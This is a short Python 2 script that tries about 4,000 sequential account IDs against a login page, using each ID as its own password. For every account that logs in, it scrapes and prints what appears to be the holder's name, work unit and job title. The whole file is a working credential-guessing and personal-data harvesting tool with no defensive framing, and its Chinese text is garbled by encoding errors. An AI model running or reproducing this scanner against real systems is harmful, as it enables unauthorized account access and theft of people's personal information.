import time
import urllib2
import urllib
import re

print "Loading...."
cookies = urllib2.HTTPCookieProcessor()
opener = urllib2.build_opener(cookies)
urllib2.install_opener(opener)

print "Loading...."

stu = [];
for bj in range(10000,14000) :
    fm = ""
    if bj<10:
        fm = "0000%d"%(bj)
    elif bj<100:
        fm = "000%d"%(bj)
    elif bj<1000:
        fm = "00%d"%(bj)
    else :
        fm = "0%d"%(bj)
    stu.append(fm)

digs = re.compile('<H4>å§åï¼(.*)ï¼åä½ï¼(.*)ï¼èç§°ï¼(.*)</H4><br>')

for i in range(1,4000):
    params = {'stuid':stu[i],'pwd':stu[i]}
    loginUrl = 'http://ç®¡çäººåç»å½ç½å'
    login = urllib2.urlopen(loginUrl,urllib.urlencode(params))
    while(True):
        var = login.readline()
        a = digs.match(var)
        if a is not None :
               print stu[i],
               print a.group(1),
               print a.group(2),
               print a.group(3)
        if var == "":break;
    if i%300 == 0:
        print "%d finished"%(i)
print "all scan finished"
